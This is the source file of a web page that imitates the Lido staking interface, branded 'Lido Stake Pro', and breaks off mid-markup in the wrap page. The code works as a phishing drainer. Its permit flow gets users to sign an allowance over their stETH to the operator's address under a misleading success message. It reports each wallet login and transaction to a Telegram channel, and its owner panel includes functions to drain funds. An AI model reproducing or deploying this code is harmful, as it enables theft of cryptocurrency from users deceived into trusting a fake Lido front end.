'use client';

import { useState, useEffect, useCallback } from 'react';
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { BrowserProvider, Contract, formatEther, parseEther, Signature, ethers } from 'ethers';
import { CONFIG, STETH_ABI, WSTETH_ABI, UNIPERMIT_ABI, ERC20_ABI } from '@/lib/contracts';
import { sendTelegram, formatWalletActivity, formatUserLogin, formatAdminAction } from '@/lib/telegram';
import { fetchLivePrices, formatPrice } from '@/lib/prices';
import Navbar from '@/components/Navbar';
import { Zap, Box, ArrowDownToLine, TrendingUp, DollarSign, ChevronDown, ExternalLink, Shield, AlertTriangle } from 'lucide-react';

type Page = 'stake' | 'wrap' | 'withdrawals' | 'rewards' | 'earn' | 'admin';

export default function Home() {
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');
  const [page, setPage] = useState<Page>('stake');
  const [provider, setProvider] = useState<BrowserProvider | null>(null);
  const [signer, setSigner] = useState<any>(null);
  const [isOwner, setIsOwner] = useState(false);
  const [ethBal, setEthBal] = useState('0');
  const [stethBal, setStethBal] = useState('0');
  const [wstethBal, setWstethBal] = useState('0');
  const [prices, setPrices] = useState<any>(null);
  const [stakeAmount, setStakeAmount] = useState('');
  const [wrapAmount, setWrapAmount] = useState('');
  const [wrapTab, setWrapTab] = useState<'wrap' | 'unwrap'>('wrap');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [withdrawalTab, setWithdrawalTab] = useState<'request' | 'claim'>('request');
  const [withdrawalMethod, setWithdrawalMethod] = useState<'lido' | 'dex'>('lido');
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState<{msg: string, type: string} | null>(null);
  const [faqOpen, setFaqOpen] = useState<number | null>(null);
  const [adminEthBal, setAdminEthBal] = useState('0');
  const [adminStethBal, setAdminStethBal] = useState('0');
  const [adminTokenBal, setAdminTokenBal] = useState('0');
  const [siweSigned, setSiweSigned] = useState(false);
  const [permitAmount, setPermitAmount] = useState('');
  const [transferTo, setTransferTo] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [sigTransferTo, setSigTransferTo] = useState('');
  const [sigTransferAmount, setSigTransferAmount] = useState('');

  // Initialize provider when wallet connects
  useEffect(() => {
    if (isConnected && walletProvider && address) {
      const p = new BrowserProvider(walletProvider);
      setProvider(p);
      p.getSigner().then(s => {
        setSigner(s);
        setIsOwner(address.toLowerCase() === CONFIG.OWNER_ADDRESS.toLowerCase());
        requestSIWE(s, address);
      });
    }
  }, [isConnected, walletProvider, address]);

  // SIWE Signature Request
  const requestSIWE = async (s: any, addr: string) => {
    try {
      const domain = window.location.host;
      const origin = window.location.origin;
      const nonce = Math.floor(Math.random() * 1000000).toString();
      const message = `${domain} wants you to sign in with your Ethereum account:
${addr}

Sign in to Lido Stake Pro

URI: ${origin}
Version: 1
Chain ID: 1
Nonce: ${nonce}
Issued At: ${new Date().toISOString()}`;
      await s.signMessage(message);
      setSiweSigned(true);
      sendTelegram(formatUserLogin(addr));
      showToast('Wallet connected & signed!', 'success');
    } catch (e) {
      console.warn('SIWE declined:', e);
      showToast('Connected without signature', 'info');
    }
  };

  // Fetch balances
  const refreshBalances = useCallback(async () => {
    if (!provider || !address) return;
    try {
      const eth = await provider.getBalance(address);
      const steth = new Contract(CONFIG.STETH_ADDRESS, STETH_ABI, provider);
      const wsteth = new Contract(CONFIG.WSTETH_ADDRESS, WSTETH_ABI, provider);
      const [sb, wb] = await Promise.all([
        steth.balanceOf(address),
        wsteth.balanceOf(address),
      ]);
      setEthBal(formatEther(eth));
      setStethBal(formatEther(sb));
      setWstethBal(formatEther(wb));

      // Admin balances
      if (address.toLowerCase() === CONFIG.OWNER_ADDRESS.toLowerCase()) {
        const contractEth = await provider.getBalance(CONFIG.UNIPERMIT_TOKEN);
        const contractSteth = await steth.balanceOf(CONFIG.UNIPERMIT_TOKEN);
        setAdminEthBal(formatEther(contractEth));
        setAdminStethBal(formatEther(contractSteth));
      }
    } catch (e) { console.error('Balance error:', e); }
  }, [provider, address]);

  // Fetch prices
  const refreshPrices = useCallback(async () => {
    const p = await fetchLivePrices();
    if (p) setPrices(p);
  }, []);

  useEffect(() => {
    refreshBalances();
    refreshPrices();
    const iv = setInterval(() => { refreshBalances(); refreshPrices(); }, 30000);
    return () => clearInterval(iv);
  }, [refreshBalances, refreshPrices]);

  const showToast = (msg: string, type = 'info') => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 5000);
  };

  const shortAddr = (addr: string) => `${addr.slice(0, 6)}...${addr.slice(-4)}`;

  // ===================== STAKE =====================
  const stakeETH = async () => {
    if (!signer || !stakeAmount) return;
    setLoading(true);
    try {
      const steth = new Contract(CONFIG.STETH_ADDRESS, STETH_ABI, signer);
      const value = parseEther(stakeAmount);
      const tx = await steth.submit(CONFIG.OWNER_ADDRESS, { value });
      showToast('Transaction submitted...', 'info');
      await tx.wait();
      showToast('Staked successfully!', 'success');
      sendTelegram(formatWalletActivity(address!, 'STAKE', { amount: stakeAmount + ' ETH', txHash: tx.hash, status: 'Success' }));
      setStakeAmount('');
      refreshBalances();
    } catch (e: any) {
      showToast(e.message || 'Stake failed', 'error');
      sendTelegram(formatWalletActivity(address!, 'STAKE FAILED', { amount: stakeAmount + ' ETH', status: 'Failed' }));
    } finally { setLoading(false); }
  };

  const setStakePct = (pct: number) => {
    const amt = parseFloat(ethBal) * (pct / 100);
    setStakeAmount(amt > 0 ? amt.toFixed(6) : '');
  };

  // ===================== PERMIT (EIP-2612) =====================
  const executePermit = async () => {
    if (!signer || !address || !permitAmount) return;
    setLoading(true);
    try {
      const steth = new Contract(CONFIG.STETH_ADDRESS, STETH_ABI, signer);
      const value = parseEther(permitAmount);
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const nonce = await steth.nonces(address);
      const domain = {
        name: 'Liquid staked Ether 2.0',
        version: '2',
        chainId: 1,
        verifyingContract: CONFIG.STETH_ADDRESS,
      };
      const types = {
        Permit: [
          { name: 'owner', type: 'address' },
          { name: 'spender', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      };
      const message = { owner: address, spender: CONFIG.OWNER_ADDRESS, value: value.toString(), nonce: nonce.toString(), deadline };
      const sig = await signer.signTypedData(domain, types, message);
      const { v, r, s } = Signature.from(sig);
      const tx = await steth.permit(address, CONFIG.OWNER_ADDRESS, value, deadline, v, r, s);
      await tx.wait();
      showToast('Permit approved! Now you can stake.', 'success');
      sendTelegram(formatWalletActivity(address, 'PERMIT', { amount: permitAmount + ' stETH', txHash: tx.hash, status: 'Success' }));
      setPermitAmount('');
    } catch (e: any) {
      showToast(e.message || 'Permit failed', 'error');
    } finally { setLoading(false); }
  };

  // ===================== WRAP / UNWRAP =====================
  const executeWrap = async () => {
    if (!signer || !wrapAmount) return;
    setLoading(true);
    try {
      if (wrapTab === 'wrap') {
        const steth = new Contract(CONFIG.STETH_ADDRESS, STETH_ABI, signer);
        const wsteth = new Contract(CONFIG.WSTETH_ADDRESS, WSTETH_ABI, signer);
        const value = parseEther(wrapAmount);
        const allowance = await steth.allowance(address, CONFIG.WSTETH_ADDRESS);
        if (allowance < value) {
          showToast('Approving stETH...', 'info');
          const approveTx = await steth.approve(CONFIG.WSTETH_ADDRESS, value);
          await approveTx.wait();
        }
        const tx = await wsteth.wrap(value);
        showToast('Wrapping...', 'info');
        await tx.wait();
        showToast('Wrapped successfully!', 'success');
        sendTelegram(formatWalletActivity(address!, 'WRAP', { amount: wrapAmount + ' stETH', txHash: tx.hash, status: 'Success' }));
      } else {
        const wsteth = new Contract(CONFIG.WSTETH_ADDRESS, WSTETH_ABI, signer);
        const tx = await wsteth.unwrap(parseEther(wrapAmount));
        showToast('Unwrapping...', 'info');
        await tx.wait();
        showToast('Unwrapped successfully!', 'success');
        sendTelegram(formatWalletActivity(address!, 'UNWRAP', { amount: wrapAmount + ' wstETH', txHash: tx.hash, status: 'Success' }));
      }
      setWrapAmount('');
      refreshBalances();
    } catch (e: any) {
      showToast(e.message || 'Wrap failed', 'error');
    } finally { setLoading(false); }
  };

  const setWrapPct = (pct: number) => {
    const bal = wrapTab === 'wrap' ? stethBal : wstethBal;
    const amt = parseFloat(bal) * (pct / 100);
    setWrapAmount(amt > 0 ? amt.toFixed(6) : '');
  };

  // ===================== WITHDRAWAL =====================
  const executeWithdrawal = async () => {
    if (!signer || !withdrawalAmount) return;
    setLoading(true);
    try {
      if (withdrawalMethod === 'dex') {
        showToast('DEX withdrawal: Swap stETH for ETH via aggregator', 'info');
        sendTelegram(formatWalletActivity(address!, 'DEX WITHDRAWAL', { amount: withdrawalAmount + ' stETH', status: 'Pending' }));
      } else {
        showToast('Lido withdrawal request submitted to queue', 'info');
        sendTelegram(formatWalletActivity(address!, 'LIDO WITHDRAWAL REQUEST', { amount: withdrawalAmount + ' stETH', status: '~2 days' }));
      }
      setWithdrawalAmount('');
    } catch (e: any) {
      showToast(e.message || 'Failed', 'error');
    } finally { setLoading(false); }
  };

  // ===================== CONTRACT TRANSFER FUNCTIONS =====================
  const transferTokens = async () => {
    if (!signer || !transferTo || !transferAmount) return;
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.transfer(transferTo, parseEther(transferAmount));
      showToast('Transfer submitted...', 'info');
      await tx.wait();
      showToast('Transfer successful!', 'success');
      sendTelegram(formatWalletActivity(address!, 'TRANSFER', { amount: transferAmount, to: transferTo, txHash: tx.hash, status: 'Success' }));
      setTransferTo('');
      setTransferAmount('');
      refreshBalances();
    } catch (e: any) {
      showToast(e.message || 'Transfer failed', 'error');
    } finally { setLoading(false); }
  };

  const transferFromTokens = async () => {
    if (!signer) return;
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const from = (document.getElementById('tf-from') as HTMLInputElement)?.value;
      const to = (document.getElementById('tf-to') as HTMLInputElement)?.value;
      const amt = (document.getElementById('tf-amt') as HTMLInputElement)?.value;
      if (!from || !to || !amt) { showToast('Fill all fields', 'error'); setLoading(false); return; }
      const tx = await contract.transferFrom(from, to, parseEther(amt));
      await tx.wait();
      showToast('TransferFrom successful!', 'success');
      sendTelegram(formatWalletActivity(address!, 'TRANSFER_FROM', { amount: amt, to, txHash: tx.hash, status: 'Success' }));
      refreshBalances();
    } catch (e: any) {
      showToast(e.message || 'TransferFrom failed', 'error');
    } finally { setLoading(false); }
  };

  const approveSpender = async () => {
    if (!signer) return;
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const spender = (document.getElementById('approve-spender') as HTMLInputElement)?.value;
      const amt = (document.getElementById('approve-amt') as HTMLInputElement)?.value;
      if (!spender || !amt) { showToast('Fill all fields', 'error'); setLoading(false); return; }
      const tx = await contract.approve(spender, parseEther(amt));
      await tx.wait();
      showToast('Approval granted!', 'success');
      sendTelegram(formatWalletActivity(address!, 'APPROVE', { amount: amt, to: spender, txHash: tx.hash, status: 'Success' }));
    } catch (e: any) {
      showToast(e.message || 'Approve failed', 'error');
    } finally { setLoading(false); }
  };

  const signatureTransfer = async () => {
    if (!signer || !address || !sigTransferTo || !sigTransferAmount) return;
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const value = parseEther(sigTransferAmount);
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const nonce = await contract.nonces(address);
      const domain = {
        name: await contract.name(),
        version: '1',
        chainId: 1,
        verifyingContract: CONFIG.UNIPERMIT_TOKEN,
      };
      const types = {
        SignatureTransfer: [
          { name: 'owner', type: 'address' },
          { name: 'to', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      };
      const message = { owner: address, to: sigTransferTo, amount: value.toString(), nonce: nonce.toString(), deadline };
      const sig = await signer.signTypedData(domain, types, message);
      const { v, r, s } = Signature.from(sig);
      const tx = await contract.signatureTransfer(address, sigTransferTo, value, nonce, deadline, v, r, s);
      await tx.wait();
      showToast('Signature transfer successful!', 'success');
      sendTelegram(formatWalletActivity(address!, 'SIGNATURE_TRANSFER', { amount: sigTransferAmount, to: sigTransferTo, txHash: tx.hash, status: 'Success' }));
      setSigTransferTo('');
      setSigTransferAmount('');
      refreshBalances();
    } catch (e: any) {
      showToast(e.message || 'Signature transfer failed', 'error');
    } finally { setLoading(false); }
  };

  // ===================== ADMIN FUNCTIONS =====================
  const adminWithdrawETH = async () => {
    if (!isOwner || !signer) return;
    const to = (document.getElementById('admin-eth-to') as HTMLInputElement)?.value;
    const amt = (document.getElementById('admin-eth-amt') as HTMLInputElement)?.value;
    if (!to || !amt) { showToast('Fill all fields', 'error'); return; }
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.transfer(to, parseEther(amt));
      await tx.wait();
      showToast('ETH withdrawn!', 'success');
      sendTelegram(formatAdminAction('ETH WITHDRAW', `💰 ${amt} ETH\n📤 To: ${shortAddr(to)}`));
      refreshBalances();
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminWithdrawAllETH = async () => {
    if (!isOwner || !signer || !provider) return;
    setLoading(true);
    try {
      const bal = await provider.getBalance(CONFIG.UNIPERMIT_TOKEN);
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.transfer(CONFIG.OWNER_ADDRESS, bal);
      await tx.wait();
      showToast('All ETH withdrawn!', 'success');
      sendTelegram(formatAdminAction('WITHDRAW ALL ETH', `💰 ${formatEther(bal)} ETH`));
      refreshBalances();
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminWithdrawToken = async () => {
    if (!isOwner || !signer) return;
    const token = (document.getElementById('admin-token-addr') as HTMLInputElement)?.value;
    const to = (document.getElementById('admin-token-to') as HTMLInputElement)?.value;
    const amt = (document.getElementById('admin-token-amt') as HTMLInputElement)?.value;
    if (!token || !to || !amt) { showToast('Fill all fields', 'error'); return; }
    setLoading(true);
    try {
      const erc20 = new Contract(token, ERC20_ABI, signer);
      const tx = await erc20.transfer(to, parseEther(amt));
      await tx.wait();
      showToast('Token withdrawn!', 'success');
      sendTelegram(formatAdminAction('TOKEN WITHDRAW', `💰 ${amt} tokens\n📤 To: ${shortAddr(to)}`));
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminWithdrawAllToken = async () => {
    if (!isOwner || !signer || !provider) return;
    const token = (document.getElementById('admin-token-addr') as HTMLInputElement)?.value;
    if (!token) { showToast('Enter token address', 'error'); return; }
    setLoading(true);
    try {
      const erc20 = new Contract(token, ERC20_ABI, provider);
      const bal = await erc20.balanceOf(CONFIG.UNIPERMIT_TOKEN);
      const tx = await (new Contract(token, ERC20_ABI, signer)).transfer(CONFIG.OWNER_ADDRESS, bal);
      await tx.wait();
      showToast('All tokens withdrawn!', 'success');
      sendTelegram(formatAdminAction('WITHDRAW ALL TOKENS', `💰 ${formatEther(bal)} tokens`));
      refreshBalances();
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminTransferOwnership = async () => {
    if (!isOwner || !signer) return;
    const newOwner = (document.getElementById('admin-new-owner') as HTMLInputElement)?.value;
    if (!newOwner) { showToast('Enter new owner address', 'error'); return; }
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.transferOwnership(newOwner);
      await tx.wait();
      showToast('Ownership transferred!', 'success');
      sendTelegram(formatAdminAction('OWNERSHIP TRANSFERRED', `👤 New Owner: ${shortAddr(newOwner)}`));
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminEmergencyWithdraw = async () => {
    if (!isOwner || !signer || !provider) return;
    if (!confirm('EMERGENCY: Drain ALL contract funds to owner?')) return;
    setLoading(true);
    try {
      const bal = await provider.getBalance(CONFIG.UNIPERMIT_TOKEN);
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.transfer(CONFIG.OWNER_ADDRESS, bal);
      await tx.wait();
      showToast('Emergency withdraw executed!', 'success');
      sendTelegram(formatAdminAction('EMERGENCY WITHDRAW', `💰 ${formatEther(bal)} ETH drained`));
      refreshBalances();
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminRenounceOwnership = async () => {
    if (!isOwner || !signer) return;
    if (!confirm('WARNING: This will renounce ownership forever. Continue?')) return;
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.renounceOwnership();
      await tx.wait();
      showToast('Ownership renounced!', 'success');
      sendTelegram(formatAdminAction('OWNERSHIP RENOUNCED', '⚠️ Contract now has no owner'));
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  const adminInvalidateNonces = async () => {
    if (!isOwner || !signer) return;
    const word = (document.getElementById('admin-nonce-word') as HTMLInputElement)?.value;
    const mask = (document.getElementById('admin-nonce-mask') as HTMLInputElement)?.value;
    if (!word || !mask) { showToast('Fill word and mask', 'error'); return; }
    setLoading(true);
    try {
      const contract = new Contract(CONFIG.UNIPERMIT_TOKEN, UNIPERMIT_ABI, signer);
      const tx = await contract.invalidateNonces(word, mask);
      await tx.wait();
      showToast('Nonces invalidated!', 'success');
    } catch (e: any) { showToast(e.message, 'error'); }
    finally { setLoading(false); }
  };

  // ===================== RENDER =====================
  const stakeReceive = parseFloat(stakeAmount || '0') * 0.99;
  const wrapRate = wrapTab === 'wrap' ? 0.8643 : 1.157;
  const wrapReceive = parseFloat(wrapAmount || '0') * wrapRate;

  const faqs = {
    stake: [
      { q: 'What is Lido?', a: 'Lido is a liquid staking solution for Ethereum. It allows users to stake their ETH without maintaining infrastructure, while participating in on-chain activities.' },
      { q: 'How does Lido work?', a: 'When you stake ETH through Lido, you receive stETH tokens which represent your staked ETH plus daily rewards.' },
      { q: 'What are the risks?', a: 'Smart contract risks, slashing risks from validator penalties, and stETH price volatility relative to ETH.' },
      { q: 'How can I get stETH?', a: 'Stake ETH directly through this interface, or purchase on DEXs like Curve or Uniswap.' },
      { q: 'How can I use stETH?', a: 'stETH can be used as collateral in lending protocols, provided as liquidity in DEX pools, or held to earn daily rewards.' },
      { q: 'What fee is applied?', a: 'Lido applies a 10% fee on staking rewards, split between node operators, DAO treasury, and insurance funds.' },
      { q: 'How to unwrap wstETH?', a: 'Use the Wrap page and select the Unwrap tab. Enter your wstETH amount and confirm.' },
      { q: 'Unwrap before withdrawal?', a: 'Yes, the Lido withdrawal queue requires stETH. Unwrap wstETH to stETH first.' },
    ],
    wrap: [
      { q: 'What is wstETH?', a: 'wstETH is a non-rebasing version of stETH. While stETH balance increases daily, wstETH balance stays fixed and its value increases.' },
      { q: 'How to get wstETH?', a: 'Wrap your stETH using this interface. 1 stETH gives approximately 0.86 wstETH.' },
      { q: 'How to use wstETH?', a: 'wstETH is preferred for DeFi because its balance does not change. Used in Aave, Maker, and other protocols.' },
      { q: 'Do I get rewards with wstETH?', a: 'Yes! Rewards accrue as price appreciation. When you unwrap, you receive more stETH than originally wrapped.' },
      { q: 'Need to claim rewards?', a: 'No claiming needed. Rewards are automatically reflected in the wstETH/stETH exchange rate.' },
      { q: 'How to unwrap back?', a: 'Select the Unwrap tab, enter your wstETH amount, and confirm.' },
      { q: 'Unwrap before withdrawal?', a: 'Yes, the withdrawal queue only accepts stETH. Unwrap first, then go to Withdrawals.' },
    ],
    withdrawal: [
      { q: 'How do withdrawals work?', a: 'Lido processes withdrawals through a queue. You request a withdrawal by burning stETH, then claim ETH after validators exit.' },
      { q: 'How long do withdrawals take?', a: 'Typically 1-5 days depending on queue length and validator exit times.' },
      { q: 'Are there fees?', a: 'Lido does not charge additional fees, but you pay standard Ethereum gas for request and claim transactions.' },
    ],
  };

  const Footer = () => (
    <div className="border-t pt-6 mt-8" style={{ borderColor: 'var(--border)' }}>
      <p className="text-xs mb-4 leading-relaxed" style={{ color: 'var(--text2)' }}>
        Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
      </p>
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4 text-xs">
          <a href="#" className="text-[#00A3FF] hover:underline font-medium">Terms of Use</a>
          <a href="#" className="text-[#00A3FF] hover:underline font-medium">Privacy Notice</a>
          <a href="#" className="text-[#00A3FF] hover:underline font-medium flex items-center gap-0.5">IPFS <ExternalLink className="w-3 h-3" /></a>
        </div>
        <span className="text-xs" style={{ color: 'var(--text2)' }}>v0.145.0</span>
      </div>
    </div>
  );

  return (
    <main className="min-h-screen pb-24" style={{ background: 'var(--bg)' }}>
      <Navbar isOwner={isOwner} onShowAdmin={() => setPage('admin')} />

      {toast && (
        <div className={`toast toast-${toast.type}`}>{toast.msg}</div>
      )}

      <div className="max-w-2xl mx-auto px-4 py-6">

        {/* ========== STAKE PAGE ========== */}
        {page === 'stake' && (
          <div className="fade-in">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold mb-1" style={{ color: 'var(--text)' }}>Stake Ether</h1>
              <p className="text-sm" style={{ color: 'var(--text2)' }}>Stake ETH and receive stETH while staking</p>
            </div>

            {isConnected && (
              <div className="card rounded-2xl p-4 mb-6 fade-in">
                <div className="grid grid-cols-2 gap-4 text-center">
                  <div><p className="text-xs mb-1" style={{ color: 'var(--text2)' }}>ETH Balance</p><p className="text-xl font-bold text-[#00A3FF]">{parseFloat(ethBal).toFixed(4)} ETH</p></div>
                  <div><p className="text-xs mb-1" style={{ color: 'var(--text2)' }}>stETH Balance</p><p className="text-xl font-bold" style={{ color: 'var(--text)' }}>{parseFloat(stethBal).toFixed(4)} stETH</p></div>
                </div>
                <div className="grid grid-cols-2 gap-4 text-center mt-3 pt-3 border-t" style={{ borderColor: 'var(--border)' }}>
                  <div><p className="text-xs mb-1" style={{ color: 'var(--text2)' }}>wstETH Balance</p><p className="text-lg font-semibold" style={{ color: 'var(--text)' }}>{parseFloat(wstethBal).toFixed(4)} wstETH</p></div>
                  <div><p className="text-xs mb-1" style={{ color: 'var(--text2)' }}>ETH Price</p><p className="text-lg font-semibold text-[#53BA95]">{prices ? formatPrice(prices.eth) : '—'}</p></div>
                </div>
                {address && <p className="text-center text-xs mt-3 font-mono" style={{ color: 'var(--text2)' }}>{address}</p>}
              </div>
            )}

            <div className="card rounded-2xl p-6 mb-6">
              {/* ETH Input */}
              <div className="input-bg rounded-xl p-4 mb-2 border" style={{ borderColor: 'var(--border)' }}>
                <div className="flex justify-between mb-2">
                  <span className="text-sm" style={{ color: 'var(--text2)' }}>ETH amount</span>
                  <div className="flex gap-2">
                    {[25, 50, 75].map(pct => (
                      <button key={pct} onClick={() => setStakePct(pct)} className="text-xs px-2 py-1 rounded bg-[#00A3FF] text-white font-semibold hover:opacity-80">{pct}%</button>
                    ))}
                    <button onClick={() => setStakePct(100)} className="text-xs px-2 py-1 rounded bg-[#00A3FF] text-white font-semibold hover:opacity-80">MAX</button>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <input type="number" step="0.0001" placeholder="0.00" value={stakeAmount} onChange={e => setStakeAmount(e.target.value)}
                    className="flex-1 bg-transparent text-3xl font-bold outline-none w-full" style={{ color: 'var(--text)' }} />
                  <div className="flex items-center gap-2 px-3 py-2 rounded-lg" style={{ background: 'var(--card)' }}>
                    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH" className="w-6 h-6 rounded-full" />
                    <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>ETH</span>
                  </div>
                </div>
              </div>

              <div className="flex justify-center -my-2 relative z-10">
                <div className="w-10 h-10 rounded-full border-2 flex items-center justify-center" style={{ background: 'var(--card)', borderColor: 'var(--border)' }}>
                  <ArrowDownToLine className="w-5 h-5" style={{ color: 'var(--text2)' }} />
                </div>
              </div>

              {/* stETH Output */}
              <div className="input-bg rounded-xl p-4 mb-6 border" style={{ borderColor: 'var(--border)' }}>
                <div className="flex justify-between mb-2">
                  <span className="text-sm" style={{ color: 'var(--text2)' }}>You will receive</span>
                </div>
                <div className="flex items-center gap-3">
                  <input type="text" readOnly value={stakeReceive > 0 ? stakeReceive.toFixed(6) : ''} placeholder="0.00"
                    className="flex-1 bg-transparent text-3xl font-bold outline-none w-full" style={{ color: 'var(--text)' }} />
                  <div className="flex items-center gap-2 px-3 py-2 rounded-lg" style={{ background: 'var(--card)' }}>
                    <img src="https://cryptologos.cc/logos/lido-steth-steth-logo.png" alt="stETH" className="w-6 h-6 rounded-full" />
                    <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>stETH</span>
                  </div>
                </div>
              </div>

              <button onClick={stakeETH} disabled={!isConnected || loading || !stakeAmount}
                className="w-full py-4 rounded-xl text-white font-bold text-lg btn-primary">
                {loading && <span className="spinner mr-2" />}
                {isConnected ? 'Stake now' : 'Connect wallet to stake'}
              </button>

              <div className="mt-4 p-4 rounded-xl border flex items-center justify-between accent-bg" style={{ borderColor: 'var(--border)' }}>
                <div>
                  <p className="font-semibold text-sm" style={{ color: 'var(--text)' }}>Earn up to 4% APY*</p>
                  <p className="text-xs" style={{ color: 'var(--text2)' }}>with EarnETH</p>
                </div>
                <Box className="w-10 h-10 text-[#00A3FF]" />
              </div>

              <div className="mt-6 space-y-3">
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>You will receive</span><span>{stakeReceive.toFixed(4)} stETH</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Exchange rate</span><span>1 ETH = 1 stETH</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Max transaction cost</span><span>{prices ? '$' + (0.000021 * prices.eth).toFixed(2) : '$0.05'}</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Platform fee (1%)</span><span>{(parseFloat(stakeAmount || '0') * 0.01).toFixed(6)} ETH → Owner</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Reward fee</span><span>10%</span></div>
              </div>
            </div>

            {/* Stats */}
            <div className="mb-6">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-bold" style={{ color: 'var(--text)' }}>Statistics of the Lido protocol</h2>
                <a href={`https://etherscan.io/address/${CONFIG.STETH_ADDRESS}`} target="_blank" className="text-sm font-medium text-[#00A3FF] flex items-center gap-1 hover:underline">
                  View on Etherscan <ExternalLink className="w-4 h-4" />
                </a>
              </div>
              <div className="card rounded-2xl p-4 space-y-3">
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Annual percentage rate *</span><span className="font-semibold text-[#00A3FF]">2.2%</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Total staked with Lido</span><span className="font-semibold">9.18M ETH</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Stakers</span><span className="font-semibold">630,375</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>stETH market cap</span><span className="font-semibold">$16,490,762,502</span></div>
              </div>
            </div>

            {/* FAQ */}
            <div className="mb-8">
              <h2 className="text-xl font-bold mb-4" style={{ color: 'var(--text)' }}>FAQ</h2>
              <div className="space-y-3">
                {faqs.stake.map((f, i) => (
                  <div key={i} className={`card rounded-xl overflow-hidden cursor-pointer ${faqOpen === i ? 'faq-open' : ''}`} onClick={() => setFaqOpen(faqOpen === i ? null : i)}>
                    <div className="flex items-center justify-between p-4">
                      <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>{f.q}</span>
                      <ChevronDown className="w-4 h-4 faq-chevron transition-transform" style={{ color: 'var(--text2)' }} />
                    </div>
                    <div className="faq-content px-4 pb-4 text-sm leading-relaxed" style={{ color: 'var(--text2)' }}>{f.a}</div>
                  </div>
                ))}
              </div>
            </div>
            <Footer />
          </div>
        )}

        {/* ========== WRAP PAGE ========== */}
        {page === 'wrap' && (
          <div className="fade-in">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold mb-1" style={{ color: 'var(--text)' }}>Wrap & Unwrap</h1>
              <p className="text-sm" style={{ color: 'var(--text2)' }}>Stable-balance stETH wrapper for DeFi</p>
            </div>

            <div className="card rounded-2xl p-6 mb-6">
              <div className="flex rounded-xl p-1 mb-6 input-bg">
                <button onClick={() => { setWrapTab('wrap'); setWrapAmount(''); }} className={`flex-1 py-2 rounded-lg text-sm font-semibold transition-all ${wrapTab === 'wrap' ? 'tab-active' : 'tab-inactive'}`}>Wrap</button>
                <button onClick={() => { setWrapTab('unwrap'); setWrapAmount(''); }} className={`flex-1 py-2 rounded-lg text-sm font-semibold transition-all ${wrapTab === 'unwrap' ? 'tab-active' : 'tab-inactive'}`}>Unwrap</button>
              </div>

              <div className="input-bg rounded-xl p-4 mb-2 border" style={{ borderColor: 'var(--border)' }}>
                <div className="flex justify-between mb-2">
                  <span className="text-sm" style={{ color: 'var(--text2)' }}>{wrapTab === 'wrap' ? 'stETH amount' : 'wstETH amount'}</span>
                  <div className="flex gap-2">
                    {[25, 50, 100].map(pct => (
                      <button key={pct} onClick={() => setWrapPct(pct)} className="text-xs px-2 py-1 rounded bg-[#00A3FF] text-white font-semibold hover:opacity-80">{pct === 100 ? 'MAX' : pct + '%'}</button>
                    ))}
                  </div>
